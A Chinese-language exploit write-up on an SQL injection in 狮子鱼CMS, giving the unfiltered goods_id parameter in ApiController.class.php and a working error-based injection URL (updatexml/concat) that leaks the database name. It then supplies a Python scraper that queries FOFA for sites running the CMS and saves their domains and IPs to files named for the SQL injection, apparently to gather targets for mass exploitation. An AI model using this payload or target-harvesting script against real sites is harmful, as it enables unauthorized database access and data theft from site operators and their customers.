#### 狮子鱼CMS-SQL注入

* * *

##### 漏洞成因：

狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞

##### 分析：

造成这个SQL注入的原因是：

ApiController.class.php 中没有对参数$good\_id进行过滤。

##### POC：

`https://www.xxx.com/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)`

#### fofa爬虫

如果有fofa会员的话，fofa是提供api的，他会把你请求的结果用json格式的数据返回给你，你可以直接解析里的各项信息，包括域名跟ip,还是很方便的。

  
但是，我们是白嫖怪，会员是不可能开的。

  
普通注册会员fofa提供50条结果，所以注册一下为好。

  

这里直接提供给各位没有会员的fofa爬虫。

  

#### FOFA爬虫：

```
1.  `import requests`
    
2.  `import urllib3`
    
3.  `from lxml import etree`
    
4.  
    
5.  `urllib3.disable_warnings() #忽略https证书告警`
    
6.  `headers = {`
    
7.  `    'Cookie': '登录后获取自己cookie',`
    
8.  `    'Upgrade-Insecure-Requests': '1',`
    
9.  `    'Referer': 'https://fofa.so/',`
    
10.  `    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'`
     
11.  `}`
     
12.  
     
13.  `# fofa搜索结果url，qbase是搜索内容的base64加密结果，page_size是每页多少个，page是页数`
     
14.  `base_url = "https://fofa.so/result?qbase64=Ii9zZWxsZXIucGhwP3M9L1B1YmxpYy9sb2dpbiIgJiYgaXNfZG9tYWluPXRydWU%3D&page_size=50&page="`
     
15.  
     
16.  
     
17.  `def get_domainList(url):`
     
18.  `    response = requests.get(url=url, verify=False, headers=headers)`
     
19.  `    selector = etree.HTML(response.text)`
     
20.  `    domainList = selector.xpath('//span[@class="aSpan"]/a/text()')`
     
21.  `    # print("domainlist:", domainList)`
     
22.  `    return domainList`
     
23.  
     
24.  
     
25.  `def get_IPLIst(url):`
     
26.  `    response = requests.get(url=url, verify=False, headers=headers)`
     
27.  `    selector = etree.HTML(response.text)`
     
28.  `    IPList = selector.xpath('//div[@class="contentMain"]/div[@class="contentLeft"]/p[2]/a[@class="jumpA"]/text()')`
     
29.  `    # print("iplist:", IPList)`
     
30.  `    return IPList`
     
31.  
     
32.  
     
33.  `def write_list(listName, filename):`
     
34.  `    f = open(filename, 'a', encoding='utf-8')`
     
35.  `    print("writeing in : ", filename)`
     
36.  `    for list1 in listName:`
     
37.  `        print(list1)`
     
38.  `        f.write(list1 +('\n'))`
     
39.  `    f.close()`
     
40.  
     
41.  
     
42.  `def main():`
     
43.  `    for i in range(1, 6):`
     
44.  `        url = base_url+str(i)`
     
45.  `        domainList = get_domainList(url)`
     
46.  `        IPList = get_IPLIst(url)`
     
47.  `        write_list(domainList, "./save_file/shiziyuSQL-domainList.txt")`
     
48.  `        write_list(IPList, "./save_file/shiziyuSQL-IPList.txt")`
     
49.  `    print("save success!")`
     
50.  
     
51.  `if __name__ == '__main__':`
     
52.  `    main()`
     
```

结果会保存在shiziyuSQL-domainList.txt和shiziyuSQL-IPList.txt中。
